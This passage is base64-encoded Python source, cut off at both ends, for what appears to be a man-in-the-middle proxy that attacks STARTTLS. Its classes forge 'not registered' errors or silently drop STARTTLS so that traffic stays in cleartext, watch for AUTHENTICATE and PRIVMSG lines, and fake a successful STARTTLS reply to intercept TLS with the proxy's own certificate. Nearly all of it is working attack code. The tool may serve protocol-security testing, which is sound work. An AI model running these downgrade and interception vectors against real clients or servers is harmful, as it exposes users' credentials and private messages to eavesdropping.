ICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiBhbnkoa3cubG93ZXIoKSBpbiBkYXRhLmxvd2VyKCkgZm9yIGt3IGluICgnYXV0aGVudGljYXRlICcsJ3ByaXZtc2cgJywgJ3Byb3RvY3RsICcpKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgDQogICAgICAgIGNsYXNzIFN0cmlwV2l0aE5vdFJlZ2lzdGVyZWQ6DQogICAgICAgICAgICAnJycgMSkgZm9yY2Ugc2VydmVyIHdyb25nIHN0YXRlIG9uIGNsaWVudCBzZW5kaW5nIFNUQVJUVExTDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgYW55KGt3Lmxvd2VyKCkgaW4gZGF0YS5sb3dlcigpIGZvciBrdyBpbiAoJ2F1dGhlbnRpY2F0ZSAnLCdwcml2bXNnICcsICdwcm90b2N0bCAnKSk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICJTVEFSVFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcGFyYW1zID0geydzcnYnOid0aGlzLnNlcnZlci5jb20nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25pY2tuYW1lJzogJyonLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NtZCc6ICdZb3UgaGF2ZSBub3QgcmVnaXN0ZXJlZCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgIyBpZiB3ZSdyZSBsdWNreSB3ZSBjYW4gZXh0cmFjdCB0aGUgdXNlcm5hbWUgZnJvbSBhIHByZXYuIHNlcnZlciBsaW5lDQogICAgICAgICAgICAgICAgICAgIHByZXZfcmVzcG9uc2UgPSBzZXNzaW9uLm91dGJvdW5kLnJlY3ZidWYuc3RyaXAoKQ0KICAgICAgICAgICAgICAgICAgICBpZiBwcmV2X3Jlc3BvbnNlOiAgDQogICAgICAgICAgICAgICAgICAgICAgICBmaWVsZHMgPSBwcmV2X3Jlc3BvbnNlLnNwbGl0KCIgIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJhbXNbJ3NydiddID0gZmllbGRzWzBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zWyduaWNrbmFtZSddID0gZmllbGRzWzJdDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgSW5kZXhFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zZW5kYWxsKCIlKHNydilzIDQ1MSAlKG5pY2tuYW1lKXMgOiUoY21kKXMNCiIlcGFyYW1zKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw9IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKCIlKHNydilzIDQ1MSAlKG5pY2tuYW1lKXMgOiUoY21kKXMNCiIlcGFyYW1zKSkpDQogICAgICAgICAgICAgICAgICAgIGRhdGE9Tm9uZQ0KICAgICAgICAgICAgICAgIGVsaWYgYW55KGt3Lmxvd2VyKCkgaW4gZGF0YS5sb3dlcigpIGZvciBrdyBpbiAoJ2F1dGhlbnRpY2F0ZSAnLCdwcml2bXNnICcsICdwcm90b2N0bCAnKSk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICANCiAgICAgICAgY2xhc3MgU3RyaXBDQVBXaXRoTm90UmVnaXN0ZXJlZDoNCiAgICAgICAgICAgICcnJyAxKSBmb3JjZSBzZXJ2ZXIgd3Jvbmcgc3RhdGUgb24gY2xpZW50IHNlbmRpbmcgQ0FQIExTDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgYW55KGt3Lmxvd2VyKCkgaW4gZGF0YS5sb3dlcigpIGZvciBrdyBpbiAoJ2F1dGhlbnRpY2F0ZSAnLCdwcml2bXNnICcsICdwcm90b2N0bCAnKSk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICJDQVAgTFMiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIHBhcmFtcyA9IHsnc3J2JzondGhpcy5zZXJ2ZXIuY29tJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICduaWNrbmFtZSc6ICcqJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjbWQnOiAnWW91IGhhdmUgbm90IHJlZ2lzdGVyZWQnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICMgaWYgd2UncmUgbHVja3kgd2UgY2FuIGV4dHJhY3QgdGhlIHVzZXJuYW1lIGZyb20gYSBwcmV2LiBzZXJ2ZXIgbGluZQ0KICAgICAgICAgICAgICAgICAgICBwcmV2X3Jlc3BvbnNlID0gc2Vzc2lvbi5vdXRib3VuZC5yZWN2YnVmLnN0cmlwKCkNCiAgICAgICAgICAgICAgICAgICAgaWYgcHJldl9yZXNwb25zZTogIA0KICAgICAgICAgICAgICAgICAgICAgICAgZmllbGRzID0gcHJldl9yZXNwb25zZS5zcGxpdCgiICIpDQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zWydzcnYnXSA9IGZpZWxkc1swXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtc1snbmlja25hbWUnXSA9IGZpZWxkc1syXQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEluZGV4RXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc2VuZGFsbCgiJShzcnYpcyA0NTEgJShuaWNrbmFtZSlzIDolKGNtZClzDQoiJXBhcmFtcykNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcigiJShzcnYpcyA0NTEgJShuaWNrbmFtZSlzIDolKGNtZClzDQoiJXBhcmFtcykpKQ0KICAgICAgICAgICAgICAgICAgICBkYXRhPU5vbmUNCiAgICAgICAgICAgICAgICBlbGlmIGFueShrdy5sb3dlcigpIGluIGRhdGEubG93ZXIoKSBmb3Iga3cgaW4gKCdhdXRoZW50aWNhdGUgJywncHJpdm1zZyAnLCAncHJvdG9jdGwgJykpOg0KICAgICAgICAgICAgICAgICAgICByZXdyaXRlLnNldF9yZXN1bHQoc2Vzc2lvbiwgVHJ1ZSkNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgDQogICAgICAgIGNsYXNzIFN0cmlwV2l0aFNpbGVudERyb3A6DQogICAgICAgICAgICAnJycgMSkgc2lsZW50bHkgZHJvcCBzdGFydHRscyBjb21tYW5kDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgYW55KGt3Lmxvd2VyKCkgaW4gZGF0YS5sb3dlcigpIGZvciBrdyBpbiAoJ2F1dGhlbnRpY2F0ZSAnLCdwcml2bXNnICcsICdwcm90b2N0bCAnKSk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICJTVEFSVFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiBhbnkoa3cubG93ZXIoKSBpbiBkYXRhLmxvd2VyKCkgZm9yIGt3IGluICgnYXV0aGVudGljYXRlICcsJ3ByaXZtc2cgJywgJ3Byb3RvY3RsICcpKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICANCiAgICAgICAgY2xhc3MgVW50cnVzdGVkSW50ZXJjZXB0Og0KICAgICAgICAgICAgJycnIDEpIERvIG5vdCBtYW5nbGUgc2VydmVyIGRhdGENCiAgICAgICAgICAgICAgICAyKSBpbnRlcmNlcHQgY2xpZW50IFNUQVJUTFMsIG5lZ290aWF0ZWQgc3NsX2NvbnRleHQgd2l0aCBjbGllbnQgYW5kIG9uZSB3aXRoIHNlcnZlciwgdW50cnVzdGVkLg0KICAgICAgICAgICAgICAgICAgIGluIGNhc2UgY2xpZW50IGRvZXMgbm90IGNoZWNrIGtleXMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiAiIGlkZW50ICIgaW4gZGF0YS5sb3dlcigpOg0KICAgICAgICAgICAgICAgICAgICAjVE9ETzogcHJveHkgaWRlbnQNCiAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgIGVsaWYgYW55KGt3Lmxvd2VyKCkgaW4gZGF0YS5sb3dlcigpIGZvciBrdyBpbiAoJ2F1dGhlbnRpY2F0ZSAnLCdwcml2bXNnICcsICdwcm90b2N0bCAnKSk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICJTVEFSVFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgIyBkbyBpbmJvdW5kIFNUQVJUVExTDQogICAgICAgICAgICAgICAgICAgIHBhcmFtcyA9IHsnc3J2JzondGhpcy5zZXJ2ZXIuY29tJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICduaWNrbmFtZSc6ICcqJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjbWQnOiAnU1RBUlRUTFMnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICMgaWYgd2UncmUgbHVja3kgd2UgY2FuIGV4dHJhY3QgdGhlIHVzZXJuYW1lIGZyb20gYSBwcmV2LiBzZXJ2ZXIgbGluZQ0KICAgICAgICAgICAgICAgICAgICBwcmV2X3Jlc3BvbnNlID0gc2Vzc2lvbi5vdXRib3VuZC5yZWN2YnVmLnN0cmlwKCkNCiAgICAgICAgICAgICAgICAgICAgaWYgcHJldl9yZXNwb25zZTogIA0KICAgICAgICAgICAgICAgICAgICAgICAgZmllbGRzID0gcHJldl9yZXNwb25zZS5zcGxpdCgiICIpDQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zWydzcnYnXSA9IGZpZWxkc1swXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtc1snbmlja25hbWUnXSA9IGZpZWxkc1syXQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEluZGV4RXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc2VuZGFsbCgiOiUoc3J2KXMgNjcwICUobmlja25hbWUpcyA6U1RBUlRUTFMgc3VjY2Vzc2Z1bCwgZ28gYWhlYWQgd2l0aCBUTFMgaGFuZHNoYWtlDQoiJXBhcmFtcykNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbICAgICAgXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcigiOiUoc3J2KXMgNjcwICUobmlja25hbWUpcyA6U1RBUlRUTFMgc3VjY2Vzc2Z1bCwgZ28gYWhlYWQgd2l0aCBUTFMgaGFuZHNoYWtlDQoiJXBhcmFtcykpKQ0KICAgICAgICAgICAgICAgICAgICBjb250ZXh0ID0gVmVjdG9ycy5HRU5FUklDLkludGVyY2VwdC5jcmVhdGVfc3NsX2NvbnRleHQoKQ0KICAgICAgICAgICAgICAgICAgICBjb250ZXh0LmxvYWRfY2VydF9jaGFpbihjZXJ0ZmlsZT1WZWN0b3JzLl9UTFNfQ0VSVEZJTEUsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXlmaWxlPVZlY3RvcnMuX1RMU19LRVlGSUxFKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw9IFsgICAgICBdW21hbmdsZWRdIHdhaXRpbmcgZm9yIGluYm91bmQgU1NMIGhhbmRzaGFrZSIlKHNlc3Npb24pKQ0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc3NsX3dyYXBfc29ja2V0X3dpdGhfY29udGV4dChjb250ZXh0LCBzZXJ2ZXJfc2lkZT1UcnVlKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw+IFsgICAgICBdICAgICAgICAgIFNTTCBoYW5kc2hha2UgZG9uZTogJXMiJShzZXNzaW9uLCBzZXNzaW9uLmluYm91bmQuc29ja2V0X3NzbC5jaXBoZXIoKSkpDQogICAgICAgICAgICAgICAgICAgICMgb3V0Ym91bmQgc3NsDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLm91dGJvdW5kLnNlbmRhbGwoZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA9PiBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcihkYXRhKSkpDQogICAgICAgICAgICAgICAgICAgIHJlc3BfZGF0YSA9IHNlc3Npb24ub3V0Ym91bmQucmVjdl9ibG9ja2VkKCkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA8PSBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcihyZXNwX2RhdGEpKSkNCiAgICAgICAgICAgICAgICAgICAgaWYgbm90ICIgNjcwICIgaW4gcmVzcF9kYXRhOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gY2xpZW50IHNlbnQgU1RBUlRUTFMgZXZlbiB0aG91Z2ggd2UgZGlkIG5vdCBhbm5vdW5jZSBpdC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIocmVzcF9kYXRhKSkNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgWyAgICAgIF0gPT4gW3NlcnZlcl1bbWFuZ2xlZF0gcGVyZm9ybWluZyBvdXRib3VuZCBTU0wgaGFuZHNoYWtlIiUoc2Vzc2lvbikpDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc3NsX3dyYXBfc29ja2V0KCkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA8PiBbc2VydmVyXSAgICAgICAgICBTU0wgaGFuZHNoYWtlIGRvbmU6ICVzIiUoc2Vzc2lvbiwgc2Vzc2lvbi5vdXRib3VuZC5zb2NrZXRfc3NsLmNpcGhlcigpKSkNCiAgICANCiAgICAgICAgICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiBhbnkoa3cubG93ZXIoKSBpbiBkYXRhLmxvd2VyKCkgZm9yIGt3IGluICgnYXV0aGVudGljYXRlICcsJ3ByaXZtc2cgJywgJ3Byb3RvY3RsICcpKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCg0KDQpjbGFzcyBSZXdyaXRlRGlzcGF0Y2hlcihvYmplY3QpOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCBnZW5lcmljX3Rsc19pbnRlcmNlcHQ9RmFsc2UpOg0KICAgICAgICBzZWxmLnZlY3RvcnMgPSB7fSAgICMgcHJvdG86W3ZlY3RvcnNdDQogICAgICAgIHNlbGYucmVzdWx0cyA9IFtdICAgIyBbIHtzZXNzaW9uLGNsaWVudF9pcCxtYW5nbGUscmVzdWx0fSwgfQ0KICAgICAgICBzZWxmLnNlc3Npb25fdG9fbWFuZ2xlID0ge30gICMgc2Vzc2lvbjptYW5nbGUNCiAgICAgICAgc2VsZi5nZW5lcmljX3Rsc19pbnRlcmNlcHQgPSBnZW5lcmljX3Rsc19pbnRlcmNlcHQNCiAgICAgICAgDQogICAgZGVmIF9fcmVwcl9fKHNlbGYpOg0KICAgICAgICByZXR1cm4gIjxSZXdyaXRlRGlzcGF0Y2hlciBzc2wvdGxzX2ludGVyY2VwdD0lcyB2ZWN0b3JzPSVzPiIlKHNlbGYuZ2VuZXJpY190bHNfaW50ZXJjZXB0LCByZXByKHNlbGYudmVjdG9ycykpDQogICAgDQogICAgZGVmIGdldF9yZXN1bHRzKHNlbGYpOg0KICAgICAgICByZXR1cm4gc2VsZi5yZXN1bHRzDQogICAgDQogICAgZGVmIGdldF9yZXN1bHRzX2J5X2NsaWVudHMoc2VsZik6DQogICAgICAgIHJlc3VsdHMgPSB7fSAgICAjY2xpZW50OnttYW5nbGU6cmVzdWx0fQ0KICAgICAgICBmb3IgciBpbiBzZWxmLmdldF9yZXN1bHRzKCk6DQogICAgICAgICAgICBjbGllbnQgPSByWydjbGllbnQnXQ0KICAgICAgICAgICAgcmVzdWx0cy5zZXRkZWZhdWx0KGNsaWVudCxbXSkNCiAgICAgICAgICAgIG1hbmdsZSA9IHJbJ21hbmdsZSddDQogICAgICAgICAgICByZXN1bHQgPSByWydyZXN1bHQnXQ0KICAgICAgICAgICAgcmVzdWx0c1tjbGllbnRdLmFwcGVuZCgobWFuZ2xlLHJlc3VsdCkpDQogICAgICAgIHJldHVybiByZXN1bHRzDQogICAgDQogICAgZGVmIGdldF9yZXN1bHQoc2VsZiwgc2Vzc2lvbik6DQogICAgICAgIGZvciByIGluIHNlbGYuZ2V0X3Jlc3VsdHMoKToNCiAgICAgICAgICAgIGlmIHJbJ3Nlc3Npb24nXT09c2Vzc2lvbjoNCiAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICByZXR1cm4gTm9uZQ0KICAgIA0KICAgIGRlZiBzZXRfcmVzdWx0KHNlbGYsIHNlc3Npb24sIHZhbHVlKToNCiAgICAgICAgciA9IHNlbGYuZ2V0X3Jlc3VsdChzZXNzaW9uKQ0KICAgICAgICByWydyZXN1bHQnXSA9IHZhbHVlDQogICAgICAgICAgDQogICAgZGVmIGFkZChzZWxmLCBwcm90bywgYXR0YWNrKToNCiAgICAgICAgc2VsZi52ZWN0b3JzLnNldGRlZmF1bHQocHJvdG8sc2V0KFtdKSkNCiAgICAgICAgc2VsZi52ZWN0b3JzW3Byb3RvXS5hZGQoYXR0YWNrKQ0KICAgICAgICANCiAgICBkZWYgZ2V0X21hbmdsZShzZWxmLCBzZXNzaW9uKToNCiAgICAgICAgJycnIHNtYXJ0IHNlbGVjdCBtYW5nbGUNCiAgICAgICAgICAgIHJldHVybiBzYW1lIG1hbmdsZSBmb3Igc2FtZSBzZXNzaW9uDQogICAgICAgICAgICByZXR1cm4gZGlmZmVyZW50IGZvciBkaWZmZXJlbnQgc2Vzc2lvbg0KICAgICAgICAgICAgdHJ5IHRvIHVzZSBhbGwgbWFuZ2xlcyBmb3Igc2FtZSBjbGllbnQtaXANCiAgICAgICAgJycnDQogICAgICAgICMgMSkgc2Vzc2lvbiBhbHJlYWR5IGhhcyBhIG1hbmdsZSBhc3NvY2lhdGVkIHRvIGl0DQogICAgICAgIG1hbmdsZSA9IHNlbGYuc2Vzc2lvbl90b19tYW5nbGUuZ2V0KHNlc3Npb24pDQogICAgICAgIGlmIG1hbmdsZToNCiAgICAgICAgICAgIHJldHVybiBtYW5nbGUNCiAgICAgICAgIyAyKSBwaWNrIG5ldyBtYW5nbGUgKHJvdW5kLXJvYmluKSBwZXIgY2xpZW50DQogICAgICAgICMgICAgDQogICAgICAgIGNsaWVudF9pcCA9IHNlc3Npb24uaW5ib3VuZC5wZWVyWzBdDQogICAgICAgIGNsaWVudF9tYW5nbGVfaGlzdG9yeSA9IFtyIGZvciByIGluIHNlbGYuZ2V0X3Jlc3VsdHMoKSBpZiByWydjbGllbnQnXT09Y2xpZW50X2lwXQ0KICAgICAgICANCiAgICAgICAgYWxsX21hbmdsZXMgPSBsaXN0KHNlbGYuZ2V0X21hbmdsZXMoc2Vzc2lvbi5wcm90b2NvbC5wcm90b2NvbF9pZCkpDQogICAgICAgIGlmIG5vdCBhbGxfbWFuZ2xlczoNCiAgICAgICAgICAgIHJldHVybiBOb25lDQogICAgICAgIG5ld19pbmRleCA9IDANCiAgICAgICAgaWYgY2xpZW50X21hbmdsZV9oaXN0b3J5Og0KICAgICAgICAgICAgcHJldmlvdXNfcmVzdWx0ID0gY2xpZW50X21hbmdsZV9oaXN0b3J5Wy0xXQ0KICAgICAgICAgICAgbmV3X2luZGV4ID0gKGFsbF9tYW5nbGVzLmluZGV4KHByZXZpb3VzX3Jlc3VsdFsnbWFuZ2xlJ10pKzEpICUgbGVuKGFsbF9tYW5nbGVzKQ0KICAgICAgICBtYW5nbGUgPSBhbGxfbWFuZ2xlc1tuZXdfaW5kZXhdDQogICAgICAgICAgICANCiAgICAgICAgc2VsZi5yZXN1bHRzLmFwcGVuZCh7J2NsaWVudCc6Y2xpZW50X2lwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnc2Vzc2lvbic6c2Vzc2lvbiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ21hbmdsZSc6bWFuZ2xlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVzdWx0JzpOb25lfSkgDQogDQogICAgICAgICNtYW5nbGUgPSBpdGVyKHNlbGYuZ2V0X21hbmdsZXMoc2Vzc2lvbi5wcm90b2NvbC5wcm90b2NvbF9pZCkpLm5leHQoKQ0KICAgICAgICBsb2dnZXIuZGVidWcoIjxSZXdyaXRlRGlzcGF0Y2hlciAgLSBjaGFuZ2VkIG1hbmdsZTogJXMgbmV3OiAlcz4iJShtYW5nbGUsIkZhbHNlIiBpZiBsZW4oY2xpZW50X21hbmdsZV9oaXN0b3J5KT5sZW4oYWxsX21hbmdsZXMpIGVsc2UgIlRydWUiKSkNCiAgICAgICAgc2VsZi5zZXNzaW9uX3RvX21hbmdsZVtzZXNzaW9uXSA9IG1hbmdsZQ0KICAgICAgICByZXR1cm4gbWFuZ2xlDQogICAgICAgIA0KICAgIGRlZiBnZXRfbWFuZ2xlcyhzZWxmLCBwcm90byk6DQogICAgICAgIG0gPSBzZWxmLnZlY3RvcnMuZ2V0KHByb3RvLHNldChbXSkpDQogICAgICAgIG0udXBkYXRlKHNlbGYudmVjdG9ycy5nZXQoTm9uZSxbXSkpDQogICAgICAgIHJldHVybiBtDQogICAgICAgIA0KICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2VsZiwgc2Vzc2lvbiwgZGF0YSk6DQogICAgICAgIGRhdGFfb3JpZyA9IGRhdGENCiAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbc2VydmVyXSAgICAgICAgICAlcyIlKHNlc3Npb24scmVwcihkYXRhKSkpDQogICAgICAgIGlmIHNlbGYuZ2V0X21hbmdsZShzZXNzaW9uKToNCiAgICAgICAgICAgIGRhdGEgPSBzZWxmLmdldF9tYW5nbGUoc2Vzc2lvbikubWFuZ2xlX3NlcnZlcl9kYXRhKHNlc3Npb24sIGRhdGEsIHNlbGYpDQogICAgICAgIGlmIGRhdGEhPWRhdGFfb3JpZzoNCiAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoZGF0YSkpKQ0KICAgICAgICByZXR1cm4gZGF0YQ0KDQogICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZWxmLCBzZXNzaW9uLCBkYXRhKToNCiAgICAgICAgZGF0YV9vcmlnID0gZGF0YQ0KICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdID0+IFtzZXJ2ZXJdICAgICAgICAgICVzIiUoc2Vzc2lvbixyZXByKGRhdGEpKSkNCiAgICAgICAgaWYgc2VsZi5nZXRfbWFuZ2xlKHNlc3Npb24pOg0KICAgICAgICAgICAgI1RPRE86IGp1c3QgdXNlIHRoZSBmaXJzdCBvbmUgZm9yIG5vdw0KICAgICAgICAgICAgZGF0YSA9IHNlbGYuZ2V0X21hbmdsZShzZXNzaW9uKS5tYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgc2VsZikNCiAgICAgICAgaWYgZGF0YSE9ZGF0YV9vcmlnOg0KICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA9PiBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcihkYXRhKSkpDQogICAgICAgIHJldHVybiBkYXRhDQogICAgDQogICAgZGVmIG9uX3JlY3ZfcGVlayhzZWxmLCBzX2luLCBzZXNzaW9uKToNCiAgICAgICAgaWYgc2VsZi5nZW5lcmljX3Rsc19pbnRlcmNlcHQ6DQogICAgICAgICAgICAjIGZvcmNlZCBieSBjbWRsaW5lLW9wdGlvbg0KICAgICAgICAgICAgcmV0dXJuIFZlY3RvcnMuR0VORVJJQy5JbnRlcmNlcHQub25fcmVjdl9wZWVrKHNlc3Npb24sIHNfaW4pDQogICAgICAgIGVsaWYgaGFzYXR0cihzZWxmLmdldF9tYW5nbGUoc2Vzc2lvbiksICJvbl9yZWN2X3BlZWsiKToNCiAgICAgICAgICAgIHJldHVybiBzZWxmLmdldF9tYW5nbGUoc2Vzc2lvbikub25fcmVjdl9wZWVrKHNlc3Npb24sIHNfaW4pDQogICAgDQpkZWYgbWFpbigpOg0KICAgIGZyb20gb3B0cGFyc2UgaW1wb3J0IE9wdGlvblBhcnNlcg0KICAgIHJldCA9IDANCiAgICB1c2FnZSA9ICIiInVzYWdlOiAlcHJvZyBbb3B0aW9uc10NCiAgICANCiAgICAgICBleGFtcGxlOiAlcHJvZyAtLWxpc3RlbiAwLjAuMC4wOjI1IC0tcmVtb3RlIG1haWwuc2VydmVyLnRsZDoyNSANCiAgICAiIiINCiAgICBwYXJzZXIgPSBPcHRpb25QYXJzZXIodXNhZ2U9dXNhZ2UpDQogICAgcGFyc2VyLmFkZF9vcHRpb24oIi1xIiwgIi0tcXVpZXQiLA0KICAgICAgICAgICAgICAgICAgYWN0aW9uPSJzdG9yZV9mYWxzZSIsIGRlc3Q9InZlcmJvc2UiLCBkZWZhdWx0PVRydWUsDQogICAgICAgICAgICAgICAgICBoZWxwPSJiZSBxdWlldCBbZGVmYXVsdDogJWRlZmF1bHRdIikNCiAgICBwY